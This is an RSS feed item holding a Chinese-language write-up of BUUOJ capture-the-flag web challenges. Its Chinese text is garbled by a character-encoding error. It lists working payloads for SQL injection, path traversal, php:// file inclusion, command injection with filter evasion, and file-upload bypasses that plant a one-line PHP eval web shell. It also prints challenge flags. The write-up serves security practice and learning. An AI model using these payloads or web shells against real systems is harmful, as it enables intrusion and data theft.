<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>CTF on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/categories/ctf/</link><description>Recent content in CTF on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Wed, 19 Jan 2022 03:16:47 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/categories/ctf/index.xml" rel="self" type="application/rss+xml"/><item><title>buuojåˆ·é¢˜è®°å½•-web</title><link>https://amiaaaz.github.io/2022/01/19/buuoj-web-wp/</link><pubDate>Wed, 19 Jan 2022 03:16:47 +0800</pubDate><guid>https://amiaaaz.github.io/2022/01/19/buuoj-web-wp/</guid><description>&lt;p>å› ä¸ºå‰é¢åšçš„å¾ˆå¤šç”±äºŽæ—¶é—´å…³ç³»é—å¿˜äº†ä¸å°‘ï¼Œè¶ç€å¯’å‡æ¥æ¸©æ•…çŸ¥æ–°åˆ·æ³¢é¢˜ï¼Œè¿™é‡Œå°±åšä¸ªbuuoj-webéƒ¨åˆ†åˆ·é¢˜çš„å­˜æ¡£ï¼Œåº”è¯¥éƒ½æ¯”è¾ƒè¯¦ç»†&lt;/p>
&lt;p>æ‰“æ˜Ÿå·çš„å¯èƒ½æ˜¯å› ä¸ºçŽ¯å¢ƒé—®é¢˜å¤çŽ°ä¸äº†ï¼Œæˆ–è€…è‡ªå·±æœ‰åœ°æ–¹æ²¡æžæ‡‚&lt;/p>
&lt;p>â€”â€”â€”â€”å‰æŽ’é£Ÿç”¨æ³¨æ„ï¼šå¯å±•å¼€çš„éƒ¨åˆ†ä¸­æ˜¯æ²¡æœ‰å¾ˆå¥½çš„mdæŽ’ç‰ˆçš„&lt;/p>
&lt;hr>
&lt;h2 id="page-01">page 01&lt;/h2>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[æžå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL
&lt;/h4>
&lt;/summary>
&lt;p>å¼±å£ä»¤ç™»å…¥&lt;/p>
&lt;p>&lt;code>admin'or 1#: 12345&lt;/code>&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[HCTF 2018]WarmUp
&lt;/h4>
&lt;/summary>
&lt;p>æŸ¥çœ‹é¡µé¢æºç æç¤ºsource.php&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">emmm&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">checkFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">&amp;amp;&lt;/span>&lt;span style="color:#111">$page&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$whitelist&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;source&amp;#34;&lt;/span>&lt;span style="color:#f92672">=&amp;gt;&lt;/span>&lt;span style="color:#d88200">&amp;#34;source.php&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;hint&amp;#34;&lt;/span>&lt;span style="color:#f92672">=&amp;gt;&lt;/span>&lt;span style="color:#d88200">&amp;#34;hint.php&amp;#34;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span> &lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$page&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">is_string&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$page&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;you can&amp;#39;t see it&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">in_array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$page&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$whitelist&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">$_page&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">mb_substr&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#111">$page&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">mb_strpos&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$page&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#d88200">&amp;#39;?&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;?&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">in_array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_page&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$whitelist&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">$_page&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">urldecode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$page&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$_page&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">mb_substr&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#111">$_page&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">mb_strpos&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_page&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#d88200">&amp;#39;?&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;?&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">in_array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_page&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$whitelist&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;you can&amp;#39;t see it&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span> &lt;span style="color:#00a8c8">empty&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_REQUEST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75af00">is_string&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_REQUEST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75af00">emmm&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#75af00">checkFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_REQUEST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">include&lt;/span> &lt;span style="color:#111">$_REQUEST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">exit&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;lt;br&amp;gt;&amp;lt;img src=&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200">https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200"> /&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>mb_substr&lt;/code>ä¸Ž&lt;code>substr&lt;/code>ç”¨æ³•ä¸€æ ·&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220117091202170.png" alt="image-20220117091202170">&lt;/p>
&lt;p>æ‰€ä»¥æˆ‘ä»¬åœ¨å‚æ•°å†…å¤šåŠ ä¸€ä¸ª&lt;code>?&lt;/code>å³å¯ï¼Œä½†æ˜¯è¦æ³¨æ„urlencodeï¼Œä»£ç ä¸­æœ‰ä¸€æ¬¡decodeï¼Œæœ¬èº«è¿˜æœ‰ä¸€æ¬¡decodeï¼Œæ‰€ä»¥è¦encodeä¸¤æ¬¡&lt;/p>
&lt;p>payload&lt;/p>
&lt;pre tabindex="0">&lt;code>/source.php?file=hint.php%253F../../../../../ffffllllaaaagggg
&lt;/code>&lt;/pre>&lt;p>å‚è€ƒï¼š&lt;a href="https://mp.weixin.qq.com/s/HZcS2HdUtqz10jUEN57aog">phpmyadmin4.8.1åŽå°getshell&lt;/a>&lt;/p>
&lt;p>åŒæ ·çš„æ–¹å¼ç»•è¿‡wafç™»å…¥æ•°æ®åº“ï¼Œåˆ›å»ºåä¸ºä¸€å¥è¯shellçš„è¡¨ï¼ŒåŒ…å«å¯¹åº”è·¯å¾„çš„æ•°æ®åº“æ–‡ä»¶å¾—åˆ°shell&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[æžå®¢å¤§æŒ‘æˆ˜ 2019]Havefun
&lt;/h4>
&lt;/summary>
&lt;p>é¡µé¢æºç &lt;/p>
&lt;pre tabindex="0">&lt;code>$cat=$_GET['cat'];
echo $cat;
if($cat=='dog'){
echo 'Syc{cat_cat_cat_cat}';
}
&lt;/code>&lt;/pre>&lt;p>payload&lt;/p>
&lt;pre tabindex="0">&lt;code>/?cat=dog
&lt;/code>&lt;/pre>&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[ACTF2020 æ–°ç”Ÿèµ›]Include
&lt;/h4>
&lt;/summary>
&lt;p>é¦–é¡µæç¤º/?file=flag.phpï¼Œæ–‡ä»¶åŒ…å«ç‚¹ï¼›å°è¯•/etc/passwdï¼ŒæˆåŠŸï¼Œ/flagå¤±è´¥ï¼Œå°è¯•phpä¼ªåè®®&lt;/p>
&lt;pre tabindex="0">&lt;code>/?file=php://filter/convert.base64-encode/resource=flag.php
&lt;/code>&lt;/pre>&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨
&lt;/h4>
&lt;/summary>
&lt;pre tabindex="0">&lt;code>1'
1' or '1
1' union select database()#
&lt;/code>&lt;/pre>&lt;p>å¾—åˆ°è¿‡æ»¤æ¡ä»¶&lt;/p>
&lt;pre tabindex="0">&lt;code>return preg_match(&amp;quot;/select|update|delete|drop|insert|where|\./i&amp;quot;,$inject);
&lt;/code>&lt;/pre>&lt;p>ä½¿ç”¨å †å æ³¨å…¥&lt;/p>
&lt;pre tabindex="0">&lt;code>1';show tables; # ä¸¤ä¸ªè¡¨ 1919810931114514, words
1';show columns from `1919810931114514`; # å«flagåˆ— ä½†åªå›žæ˜¾2åˆ—
1';show columns from `words`; # å›žæ˜¾3åˆ—id+data éƒ½æ˜¯ç©ºçš„
&lt;/code>&lt;/pre>&lt;p>æŠŠ&lt;code>1919810931114514&lt;/code>è¡¨æ”¹åä¸º&lt;code>words&lt;/code>ï¼Œflagæ”¹ä¸ºidï¼Œå³å¯å›žæ˜¾å¯¹åº”çš„data&lt;/p>
&lt;pre tabindex="0">&lt;code>1';alter table words rename to amiz;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50);#
1' or '1 # å¾—åˆ°flag
&lt;/code>&lt;/pre>&lt;p>â€”â€”â€”â€”æˆ–è€…ä½¿ç”¨&lt;code>set&lt;/code>&amp;amp;&lt;code>prepare from&lt;/code>&amp;amp;&lt;code>execute&lt;/code>çš„æ–¹å¼æ¥å †å &lt;/p>
&lt;pre tabindex="0">&lt;code>1';set @xx=concat('se','lect * from `1919810931114514`;');prepare x from @xx;execute x;#
&lt;/code>&lt;/pre>&lt;p>å›žæ˜¾è¿‡æ»¤æ¡ä»¶&lt;/p>
&lt;pre tabindex="0">&lt;code>strstr($inject, &amp;quot;set&amp;quot;) &amp;amp;&amp;amp; strstr($inject, &amp;quot;prepare&amp;quot;)
&lt;/code>&lt;/pre>&lt;p>ç”¨å¤§å†™ç»•è¿‡&lt;/p>
&lt;pre tabindex="0">&lt;code>1';Set @xx=concat('se','lect * from `1919810931114514`;');Prepare x from @xx;execute x;#
&lt;/code>&lt;/pre>&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[SUCTF 2019]EasySQL
&lt;/h4>
&lt;/summary>
&lt;pre tabindex="0">&lt;code>1;show tables; # Flag
1;show columns from Flag; # è¢«è¿‡æ»¤
&lt;/code>&lt;/pre>&lt;p>ç”±äºŽæ²¡æœ‰å®Œæ•´çš„æŠ¥é”™é¦–å…ˆçŒœä¸€ä¸‹åŽç«¯è¯­å¥ï¼Œè¾“å…¥éž0æ•°å­—å›žæ˜¾ä¸º1ï¼Œå…¶ä½™ä¸ºç©ºï¼ŒæŽ¨æµ‹åŽç«¯æœ‰&lt;code>||&lt;/code>è¾“å‡º0çš„æƒ…å†µ&lt;/p>
&lt;pre tabindex="0">&lt;code>select $_POST['query'] || flag from Flag;
&lt;/code>&lt;/pre>&lt;p>payload&lt;/p>
&lt;pre tabindex="0">&lt;code>*,1
# ç›¸å½“äºŽ select *,1 from Flag;
&lt;/code>&lt;/pre>&lt;p>â€”â€”â€”â€”æˆ–è€…ä½¿ç”¨å †å ï¼Œpayload&lt;/p>
&lt;pre tabindex="0">&lt;code>1;set sql_mode=PIPES_AS_CONCAT;select 1
&lt;/code>&lt;/pre>&lt;p>å°†&lt;code>||&lt;/code>è½¬å˜ä¸º&lt;code>+&lt;/code>ä¸€æ ·çš„è¿žæŽ¥å­—ç¬¦&lt;/p>
&lt;p>flag{4032c605-fa39-448d-aa2d-f35fca8d3fa9}&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[ACTF2020 æ–°ç”Ÿèµ›]Exec
&lt;/h4>
&lt;/summary>
&lt;p>payload&lt;/p>
&lt;pre tabindex="0">&lt;code>127.0.0.1;cat /flag
&lt;/code>&lt;/pre>&lt;p>flag{f8c12653-ce6e-4eef-8f69-9433506d5adc}&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[æžå®¢å¤§æŒ‘æˆ˜ 2019]Secret File
&lt;/h4>
&lt;/summary>
&lt;p>é¡µé¢æºç æç¤º/Archive_room.phpï¼Œ/end.phpï¼Œ/secr3t.phpçœ‹åˆ°æ–‡ä»¶åŒ…å«ç‚¹ï¼Œç”¨ä¼ªåè®®&lt;/p>
&lt;p>payload&lt;/p>
&lt;pre tabindex="0">&lt;code>/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php
&lt;/code>&lt;/pre>&lt;p>flag{7719d9f9-6f2f-46f7-bc78-a82cfc52d470}&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[æžå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL
&lt;/h4>
&lt;/summary>
&lt;p>ä¸‡èƒ½å¯†ç ç™»å…¥ï¼Œå¾—åˆ°å¯†ç æ˜¯bd798bc32e819b4f57d4e1523d5834c6&lt;/p>
&lt;pre tabindex="0">&lt;code>admin' union select 1,2,3# # æœ‰3åˆ—
1' union select 1,database(),3# # å›žæ˜¾ä½åœ¨2å’Œ3ä¸Š åº“ågeek
1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database();# # è¡¨ågeekuser, l0ve1ysq1
1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='l0ve1ysq1';# # id, username, password
1' union select 1,2,group_concat(id,username,password) from l0ve1ysq1#
&lt;/code>&lt;/pre>&lt;p>æ³¨æ„&lt;code>group_concat()&lt;/code>æ˜¯ä¸ªå‡½æ•°ï¼Œæ†‹æ‰‹æ¬ åŠ ç©ºæ ¼&lt;/p>
&lt;p>flag{e210152f-fc19-4139-9d2a-dcbb6c4c6268}&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[GXYCTF2019]Ping Ping Ping
&lt;/h4>
&lt;/summary>
&lt;pre tabindex="0">&lt;code>127.0.0.1;ls # index.php, flag.php
127.0.0.1;cat flag.php # fxck your space!
127.0.0.1;cat$IFSindex.php # ç©ºå†…å®¹
127.0.0.1;cat$IFSflag.php # fxck your flag!
127.0.0.1;cat$IFS$7`ls` # é¡µé¢æºç å¾—åˆ°flag
127.0.0.1;a=g;cat$IFS$7fla$a.php # é¡µé¢æºç å¾—åˆ°flag
&lt;/code>&lt;/pre>&lt;p>flag{281616ef-7318-42b6-adaf-825edf76ff26}&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[æžå®¢å¤§æŒ‘æˆ˜ 2019]Knife
&lt;/h4>
&lt;/summary>
&lt;p>ç™½ç»™shellï¼Œè¿žèšå‰‘&lt;/p>
&lt;p>flag{95a76aa0-58b5-4494-bb49-7f11ce00774d}&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[æžå®¢å¤§æŒ‘æˆ˜ 2019]Http
&lt;/h4>
&lt;/summary>
&lt;p>é¡µé¢æºç æç¤º/Secret.phpï¼Œè·Ÿç€æç¤ºä¸€ç›´ä¿®æ”¹è¯·æ±‚å¤´&lt;/p>
&lt;pre tabindex="0">&lt;code>Referer: https://Sycsecret.buuoj.cn
User-Agent: Syclover
X-Forwarded-For: 127.0.0.1
&lt;/code>&lt;/pre>&lt;p>flag{614f3098-1c0f-480b-97f7-9caa49025e83}&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[æžå®¢å¤§æŒ‘æˆ˜ 2019]Upload
&lt;/h4>
&lt;/summary>
&lt;p>è¿‡æ»¤äº†å‡ ä¸ªå¸¸è§„çš„phpåŽç¼€ï¼Œç”¨.php7ç»•è¿‡ï¼ŒåŒæ—¶æŠ“åŒ…ä¿®æ”¹MIMEä¸ºimage/png&lt;/p>
&lt;p>ä¹‹åŽå‘çŽ°å®ƒä¼šæ£€æµ‹ä¸Šä¼ å†…å®¹æœ‰æ²¡æœ‰&lt;code>&amp;lt;?&lt;/code>ï¼Œç”¨gif+phtmlæ ·å¼çš„ðŸŽ&lt;/p>
&lt;p>pure.phtml&lt;/p>
&lt;pre tabindex="0">&lt;code>GIF89a
&amp;lt;script language='php'&amp;gt;eval($_POST['amiz']);&amp;lt;/script&amp;gt;
&lt;/code>&lt;/pre>&lt;p>è¿žèšå‰‘&lt;/p>
&lt;p>flag{23be575a-679e-4f7c-b75b-6e033d10bfca}&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[ACTF2020 æ–°ç”Ÿèµ›]Upload
&lt;/h4>
&lt;/summary>
&lt;p>å‰ç«¯é™åˆ¶åŽç¼€ç™½åå•jpg, png, gifï¼Œåˆ å®¡æŸ¥å…ƒç´ ä¼šåˆ ä¸æŽ‰å·²ç»æ³¨å†Œäº†çš„å›žè°ƒå‡½æ•°ï¼Œæ‰€ä»¥ç›´æŽ¥æ”¹åŽç¼€åä¸Šä¼ ï¼Œç„¶åŽæŠ“åŒ…æ”¹ä¸€ä¸‹&lt;/p>
&lt;p>pure.html&lt;/p>
&lt;pre tabindex="0">&lt;code>GIF89a
&amp;lt;script language='php'&amp;gt;eval($_POST['amiz']);&amp;lt;/script&amp;gt;
&lt;/code>&lt;/pre>&lt;p>è¿žèšå‰‘&lt;/p>
&lt;p>flag{a8ff29f2-5197-4599-a1c4-1e8b5f390a8c}&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[RoarCTF 2019]Easy Calc
&lt;/h4>
&lt;/summary>
&lt;p>é¡µé¢æºç ï¼šI&amp;rsquo;ve set up WAF to ensure security.&lt;/p>
&lt;p>numå‚æ•°ä»¥getæ–¹å¼ä¼ å…¥ï¼Œä¸å…è®¸æœ‰å­—æ¯ï¼›ç»•è¿‡æ–¹å¼&lt;code>/calc.php ?num=xyx&lt;/code>ï¼ŒåŠ ç©ºæ ¼ï¼›è¿˜æœ‰&lt;code>chr()&lt;/code>+asciiç &lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">tmp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">input&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;span style="color:#111">res&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">_&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">tmp&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">res&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;chr(&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ord&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">_&lt;/span>&lt;span style="color:#111">))&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">).&amp;#39;&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">res&lt;/span>&lt;span style="color:#111">[:&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>/calc.php? num=1;var_dump(scandir(chr(47))) # çˆ†ç›®å½•æ–‡ä»¶ f1agg
/calc.php? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))
&lt;/code>&lt;/pre>&lt;p>flag{4f1c0f5a-5a7b-4ad4-b7f4-9eb82de3f93f}&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[æžå®¢å¤§æŒ‘æˆ˜ 2019]PHP
&lt;/h4>
&lt;/summary>
&lt;p>å¤‡ä»½æ–‡ä»¶æ³„éœ²/www.zipï¼Œflag.phpä¸­å¾—åˆ°flag&lt;/p>
&lt;p>Syc{dog_dog_dog_dog}&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[æžå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL
&lt;/h4>
&lt;/summary>
&lt;p>æŠŠunion, selectåŒå†™å³å¯&lt;/p>
&lt;pre tabindex="0">&lt;code>admin' ununionion selselectect 1,2,3#
1' uunionnion sselectelect 1,2,group_concat(schema_name) ffromrom infoorrmation_schema.schemata%23 # åº“åinformation_schema,mysql,performance_schema,test,ctf,geek
1' ununionion seselectlect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whewherere table_schema='ctf'%23 # è¡¨å Flag
1' ununionion seselectlect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name='Flag' # å­—æ®µåflag
1' union select 1,2,group_concat(flag) from ctf.Flag # ctfåº“Flagè¡¨çš„flagå­—æ®µ
&lt;/code>&lt;/pre>&lt;p>flag{b6848383-f7d0-4cad-ad7d-98ab54790bbe}&lt;/p>
&lt;p>å¯ä»¥å†™ä¸€ä¸ªminiè½®ï¼Œç”¨äºŽsqlè¯­å¥åŒå†™ï¼ˆè‡ªå·±å†™çš„æ¯”è¾ƒæ¸£å°±ä¸æ”¾äº†æ&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[ACTF2020 æ–°ç”Ÿèµ›]BackupFile
&lt;/h4>
&lt;/summary>
&lt;p>/index.php.bak&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">include_once&lt;/span> &lt;span style="color:#d88200">&amp;#34;flag.php&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;key&amp;#39;&lt;/span>&lt;span style="color:#111">]))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;key&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">is_numeric&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">exit&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Just num!&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
